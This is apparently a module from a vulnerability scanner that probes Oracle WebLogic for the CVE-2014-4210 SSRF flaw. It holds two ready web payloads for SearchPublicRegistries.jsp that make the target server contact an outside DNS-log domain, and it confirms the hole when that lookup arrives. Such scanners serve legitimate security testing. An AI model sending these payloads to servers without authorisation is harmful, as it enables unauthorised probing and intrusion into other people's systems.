#!/usr/bin/env python3
# -*- coding:utf-8 -*-

from lib.api.dns import dns
from lib.tool.md5 import random_md5
from time import sleep

cve_2014_4210_payloads = [
    {'path': 'uddiexplorer/SearchPublicRegistries.jsp?operator=http://DNSDOMAIN/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'},
    {'path': 'SearchPublicRegistries.jsp?operator=http://DNSDOMAIN/&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'}
]

def cve_2014_4210_scan(self, clients):
    ''' Weblogic uddiexplorer SSRF漏洞
            uddiexplorer组件的SearchPublicRegistries.jsp页面存在一个SSRF漏洞
    '''
    client = clients.get('reqClient')
    sessid = '0fe976335bbe903a97650f15dcb0ce47'

    vul_info = {
        'app_name': self.app_name,
        'vul_type': 'SSRF',
        'vul_id': 'CVE-2014-4210',
    }

    for payload in cve_2014_4210_payloads:
        md = random_md5()                                       # * 随机md5值, 8位
        dns_domain = md + '.' + dns.domain(sessid)              # * dnslog/ceye域名

        path = payload['path'].replace('DNSDOMAIN', dns_domain)

        res = client.request(
            'get',
            path,
            vul_info=vul_info
        )
        if res is None:
            continue

        sleep(3)                                        # * dns查询可能较慢, 等一会
        if (dns.result(md, sessid)):
            results = {
                'Target': res.request.url,
                'Type': [vul_info['app_name'], vul_info['vul_type'], vul_info['vul_id']],
                'Request': res
            }
            return results
    return None
